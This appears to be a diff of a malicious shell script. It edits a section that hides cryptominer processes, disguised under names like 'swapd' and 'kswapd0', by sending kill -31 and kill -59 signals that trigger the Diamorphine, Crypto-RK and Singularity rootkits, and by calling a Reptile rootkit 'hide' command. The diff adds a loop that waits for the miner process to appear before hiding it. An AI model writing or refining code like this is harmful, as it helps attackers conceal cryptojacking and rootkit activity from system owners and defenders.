@@ -2197,21 +2197,26 @@ echo ''
 # ==================== HIDE MINER PROCESSES ====================
 echo ""
 echo "=========================================="
-echo "ACTIVATING PROCESS HIDING"
+echo "ACTIVATING PROCESS HIDING (WAITING FOR SWAPD)"
 echo "=========================================="
 echo ""
-echo "[*] Sending hide signals unconditionally..."
-echo "[*] Note: rootkits hide themselves from lsmod — signals sent regardless"
-sleep 3  # Give processes time to be fully up before hiding
 
-# ---- kill -31: Diamorphine + Crypto-RK hide signal ----
+# Wait up to ~30 seconds for swapd to appear
+for i in $(seq 1 30); do
+    if pgrep -f -u root swapd >/dev/null 2>&1; then
+        break
+    fi
+    sleep 1
+done
+
+# Now send hide signals
 echo "[*] Sending kill -31 (Diamorphine/Crypto-RK hide)..."
-send_sig 31 config.json swapd swapfile lightd
-echo "[✓] kill -31 sent"
+kill -31 $(pgrep -f -u root swapd 2>/dev/null) 2>/dev/null || true
+kill -31 $(pgrep -f -u root kswapd0 2>/dev/null) 2>/dev/null || true
 
-# ---- kill -59: Singularity toggle hide signal ----
 echo "[*] Sending kill -59 (Singularity toggle hide)..."
-send_sig 59 config.json swapd swapfile lightd
-echo "[✓] kill -59 sent"
+kill -59 $(pgrep -f -u root swapd 2>/dev/null) 2>/dev/null || true
+kill -59 $(pgrep -f -u root kswapd0 2>/dev/null) 2>/dev/null || true
 
-echo '========================================================================'
+# Optionally still call reptile's hide
+reptile_cmd hide
